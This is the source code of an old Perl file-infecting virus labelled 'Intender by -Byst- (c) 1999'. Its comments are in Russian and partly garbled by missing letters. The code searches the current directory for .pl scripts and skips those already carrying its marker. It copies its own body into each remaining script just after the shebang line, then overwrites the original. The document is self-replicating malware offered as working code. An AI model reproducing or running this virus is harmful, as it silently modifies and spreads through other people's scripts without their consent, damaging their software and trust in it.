#here virus starts
# Intender by -Byst- (c) 1999
$source = __FILE__;
while (<*.pl>)
{
  $name = $_;                    # Имя ф йл -жертвы
  $cname = crypt($name,$name);   # Имя промежуточного ф йл 

  # Проверим не инфициров н ли уже ф йл?

  open(TARGET,"<$name");         # жертв 
  $allready_infected = 0;
  while (<TARGET>) {
   if (index($_,"\x23 Intender by -Byst- (c) 1999") == 0)
    { $allready_infected = 1;}   # уже инфициров н!
  }
  close(TARGET);
  if ($allready_infected == 1 )
   { next;}                      # переходим к следующей жертве

  # Проверим, нет ли в теле жертвы строк тип  !/usr/bin/perl
  open(TARGET,"<$name");         # жертв 
  $flag = 0;
  while (<TARGET>) {
   if (index($_,"\x23!") == 0)   # Н шли т кую строку
    { $flag = 1;}                # взводим фл г
  }
  close(TARGET);

  # Созд ем ч сть в которой содержится вызов процедуры инфициров ния
  open(TARGET,"<$name");         # жертв 
  open(FBUF,">$cname");          # промежуточный ф йл

  if ($flag == 1) {              # у жертвы есть обозн чение н ч л  прогр ммы?
   while (<TARGET>) {            # ищем его
    print(FBUF);                 # сохр няем все строки жертвы до #!
    if (index($_,"\x23!") == 0 ) #  г , вот и н ч ло прогр ммы
      { last;}
   }
  }

  # ищем тел  процедур
  $_ = "\n";print(FBUF);
  open(SOURCE,"<$source");       #  т кующий ф йл
  while(<SOURCE>) {              # ищем призн к н ч л  - "#here virus starts"
   if (index($_,"\x23here virus starts") == 0) { last;}
  }
  print(FBUF);
  # весь текст процедур -> промежуточный ф йл
  while (<SOURCE>) {
   print(FBUF);
   if (index($_,"\x23here virus ends") == 0) { last;}
  }
  close(SOURCE);
  $_ = "\n";print(FBUF);
  # ост вшуюся ч сть жертвы -> промежуточный ф йл
  while (<TARGET>) {
   print(FBUF);
  }
  close(TARGET);
  close(FBUF);
  rename($cname,$name);
}
#here virus ends


